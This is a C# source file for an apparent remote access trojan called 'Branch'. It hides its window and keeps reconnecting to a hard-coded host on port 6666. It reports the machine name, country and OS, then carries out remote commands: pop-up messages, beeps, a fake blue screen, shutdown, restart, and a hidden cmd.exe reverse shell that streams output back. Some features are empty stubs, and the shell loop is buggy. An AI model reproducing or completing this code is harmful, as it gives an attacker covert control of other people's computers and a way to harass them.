using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Globalization;

namespace Branch
{
    public partial class Branch : Form
    {   
        private TcpClient client = new TcpClient();
        private TcpListener listener;
        private NetworkStream stream;
        private StreamReader reader;
        private StreamWriter writer;
        private StringBuilder builder;
        private Process cmd;
        private BlueScreen bs = new BlueScreen();
        private Thread thBlueScreen;

        private enum cmds
        {
            Message = 1, Beep = 2, BlueScreen = 3, Shutdown = 4, Ping = 5, FileExplorer = 6, CMD = 7,
            Camera = 8, RDP = 9, Kill = 10, Restart = 11, Chat = 12, UndoBS = 13
        }

        public Branch()
        {
            InitializeComponent();
        }

        private void Branch_Shown(object sender, EventArgs e)
        {
            this.Hide();
            for (; ; )
            {
                ExtendBranch();
                Thread.Sleep(5000);
            }
        }

        private void ExtendBranch()
        {
            if(!client.Connected)
            {
                try
                {
                    client = new TcpClient("192.168.1.2", 6666);
                    stream = client.GetStream();
                    reader = new StreamReader(stream);
                    writer = new StreamWriter(stream);
                }
                catch (Exception err) { return; }
            }

            string CompName = Environment.MachineName.ToString();
            string OS = Environment.OSVersion.ToString();
            string culture = CultureInfo.CurrentCulture.EnglishName;
            string Country = culture.Substring(culture.IndexOf('(') + 1, culture.LastIndexOf(')') - culture.IndexOf('(') - 1);

            string SendData = CompName + "," + Country + "," + OS;
            writer.Write(SendData);

            try
            {
                string[] DeviceInfo = { Environment.MachineName, Environment.OSVersion.ToString() };
                
                writer.WriteLine(System.Environment.MachineName);
                writer.Flush();

                string line;
                int command = 0;
                while (true)
                {
                    line = "";
                    line = reader.ReadLine();
                    command = int.Parse(line);

                    switch((cmds)command)
                    {
                        case cmds.Message:
                            string msg = reader.ReadLine();
                            Thread thMessage = new Thread(() => Message(msg));
                            thMessage.Start();
                            break;
                        case cmds.Beep:
                            //string data = reader.ReadLine();
                            //string[] csv = data.Split(',');
                            Thread thBeep = new Thread(Beep);
                            thBeep.Start();
                            break;
                        case cmds.BlueScreen:
                            thBlueScreen = new Thread(new ThreadStart(Bluescreen));
                            thBlueScreen.Start();
                            break;
                        case cmds.UndoBS:
                            UndoBluescreen();
                            break;
                        case cmds.CMD:
                            /*string wait = reader.ReadLine();
                            Thread CMD = new Thread(new ThreadStart(CMDLine));
                            CMD.Start();*/
                            CMDLine();
                            break;
                        case cmds.FileExplorer:
                            break;
                        case cmds.Ping:
                            break;    
                        case cmds.Camera:
                            break;
                        case cmds.RDP:
                            break;
                        case cmds.Kill:
                            EndBranch();
                            break;
                        case cmds.Shutdown:
                            Shutdown();
                            break;
                        case cmds.Restart:
                            Restart();
                            break;
                        case cmds.Chat:
                            Thread Chat = new Thread(new ThreadStart(StartChat));
                            Chat.Start();
                            break;
                    }
                }
            }
            catch (Exception e) 
            {
                Cleanup();
            }
        }

        private void EndBranch()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private void Cleanup()
        {
            stream.Close();
            reader.Close();
            writer.Close();
        }

        /*
         * Commands
         */
        private void Beep() { Console.Beep(2000, 500); }
        private void Beep(string[] csv) 
        {
            int freq = int.Parse(csv[0]);
            int duration = int.Parse(csv[1]);
            Console.Beep(freq, duration); 
        }
        private void Message(string msg) { MessageBox.Show(msg); }
        //private void Message() { MessageBox.Show("Now become one..."); }
        private void Bluescreen() { BlueScreen bs = new BlueScreen();  Application.Run(bs); }
        private void UndoBluescreen() { thBlueScreen.Join(); }
        private void CMDLine()
        {
            StreamReader rdr = new StreamReader(stream);
            builder = new StringBuilder();
            cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardError = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
            cmd.Start();
            cmd.BeginOutputReadLine();

            while (true)
            {
                try
                {
                    builder.Append(rdr.ReadLine());
                    builder.Append("\n");
                    if (builder.ToString().LastIndexOf("terminate") >= 0) Cleanup(); break;
                    if (builder.ToString().LastIndexOf("exit") >= 0) CMDCleanUp(); break;
                    cmd.StandardInput.WriteLine(builder);
                    builder.Remove(0, builder.Length);
                }
                catch (Exception e) { CMDCleanUp(); }
            }
        }
        private void Shutdown()
        {
            var proc = new ProcessStartInfo("shutdown", "/s/t 0");
            proc.CreateNoWindow = true;
            proc.UseShellExecute = false;
            Process.Start(proc);
        }
        private void Restart()
        {
            var proc = new ProcessStartInfo("shutdown.exe", "-r -t 0");
            proc.CreateNoWindow = true;
            proc.UseShellExecute = false;
            Process.Start(proc);
        }
        private void StartChat()
        {
            //Chat chat = new Chat(reader, writer);
            //Application.Run(chat);
        }
        private void CMDCleanUp()
        {
            try { cmd.Kill(); }
            catch (Exception e) { }
        }
        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    writer.WriteLine(strOutput.ToString());
                    writer.Flush();
                }
                catch (Exception err) { }
            }
        }
        private void StartUp()
        {

        }
    }
}